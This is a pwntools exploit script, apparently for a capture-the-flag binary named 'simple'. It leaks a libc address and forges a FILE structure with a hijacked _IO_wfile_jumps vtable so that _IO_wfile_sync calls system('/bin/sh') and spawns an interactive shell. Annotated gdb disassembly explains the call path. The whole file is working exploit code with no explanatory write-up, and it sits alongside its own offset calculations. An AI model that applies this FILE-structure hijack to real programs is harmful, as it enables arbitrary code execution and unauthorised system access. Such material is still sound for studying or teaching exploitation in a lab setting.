from pwn import *

context.arch = 'amd64'

elf = ELF('./simple')
libc = ELF('./libc.so.6')

r = process('./simple')

buf_addr = elf.symbols['buf']
bss = elf.bss()


r.recvuntil('@ ')
libc_base = int(r.recvline().strip(), 16) - libc.symbols['_IO_list_all']
system = libc_base + libc.symbols['system']
print "system @ ", hex(system)


vtable = libc_base + 0x3e7ca0    # _IO_wfile_jumps_mmap
print("vtable @ ", hex(vtable))
sh = libc.search('/bin/sh').next() + libc_base


'''
rdi = rbx = fd
0x7ffff786671b <_IO_wfile_sync+11> mov    rax, QWORD PTR [rdi+0xa0]
0x7ffff7866722 <_IO_wfile_sync+18> mov    rdx, QWORD PTR [rax+0x20]
0x7ffff7866726 <_IO_wfile_sync+22> mov    rsi, QWORD PTR [rax+0x18]
0x7ffff786672a <_IO_wfile_sync+26> cmp    rdx, rsi
0x7ffff786672d <_IO_wfile_sync+29> jbe    0x7ffff786675d <__GI__IO_wfile_sync+77> # taken is better , but not taken is ok
0x7ffff786675d <_IO_wfile_sync+77> mov    rcx, QWORD PTR [rax]
0x7ffff7866760 <_IO_wfile_sync+80> mov    rdx, QWORD PTR [rax+0x8]
0x7ffff7866764 <_IO_wfile_sync+84> mov    rsi, rcx
0x7ffff7866767 <_IO_wfile_sync+87> sub    rsi, rdx
0x7ffff786676a <_IO_wfile_sync+90> sar    rsi, 0x2
0x7ffff786676e <_IO_wfile_sync+94> cmp    rcx, rdx
0x7ffff7866771 <_IO_wfile_sync+97> mov    r12, rsi
0x7ffff7866774 <_IO_wfile_sync+100> je     0x7ffff7866819 <__GI__IO_wfile_sync+265> # should be not taken
0x7ffff786677a <_IO_wfile_sync+106> mov    rbp, QWORD PTR [rbx+0x98]
0x7ffff7866781 <_IO_wfile_sync+113> mov    rdi, rbp
0x7ffff7866784 <_IO_wfile_sync+116> call   QWORD PTR [rbp+0x20]
'''

buf = fit({
		# we only have one buf, so 0: controls both rdi and rsi
		0: flat('/bin/sh'),       # rdi
		#0: p64(0xdeadbeef*4),    # rcx, rsi_2
		0x8:  p64(0),             # rdx_2
		0x18: p64(system+1),      # rsi_1
		0x20: p64(system),        # rdx_1, call [rbp+0x20]
	},filler=(ord('\x00'),))

fd = fit({
		0x88: p64(0x601880),      # lock
		0x98: p64(buf_addr),           # rbp , rdi,  call [rbp+0x20]
		0xa0: p64(buf_addr),           # rax
		0xc0: p32(0xffffffff),
		0xd8: flat(vtable+0x28),
	},filler=(ord('\x00'),))

r.sendlineafter('buf:', buf)
gdb.attach(r, 'b puts\nc')
r.sendlineafter('stdout:', fd)

r.interactive()